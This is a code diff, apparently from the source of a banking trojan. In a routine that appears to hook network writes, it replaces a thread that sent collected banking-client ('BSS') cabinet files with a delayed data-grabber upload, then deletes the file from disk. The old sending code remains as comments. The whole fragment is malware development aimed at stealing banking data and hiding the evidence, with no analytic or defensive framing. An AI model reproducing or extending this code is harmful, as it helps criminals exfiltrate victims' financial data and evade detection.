@@ -328,19 +328,23 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 
 		CloseCab( pBanking->hCab );
 
-		PBSSINIST pBank = (PBSSINIST)MemAlloc( sizeof( PBSSINIST ) );
+		DataGrabber::SendCabDelayed(NULL, pBanking->Path, "BSS");
+        pDeleteFileA(pBanking->Path);
 
-		if ( pBank )
-		{
-			pBank->dwType	= 1;
-			pBank->FilePath = (char*)MemAlloc( m_lstrlen( pBanking->Path ) + 1 );
-
-			m_memcpy( pBank->FilePath, pBanking->Path, m_lstrlen( pBanking->Path ) );
-		
-			StartThread( SendBSSInist, pBank );
-		}
+//		PBSSINIST pBank = (PBSSINIST)MemAlloc( sizeof( PBSSINIST ) );
+//
+//		if ( pBank )
+//		{
+//			pBank->dwType	= 1;
+//			pBank->FilePath = (char*)MemAlloc( m_lstrlen( pBanking->Path ) + 1 );
+//
+//			m_memcpy( pBank->FilePath, pBanking->Path, m_lstrlen( pBanking->Path ) );
+//
+//			StartThread( SendBSSInist, pBank );
+//		}
 
 		MemFree( pBanking );
+		pBanking = NULL;
 	}
 }
 
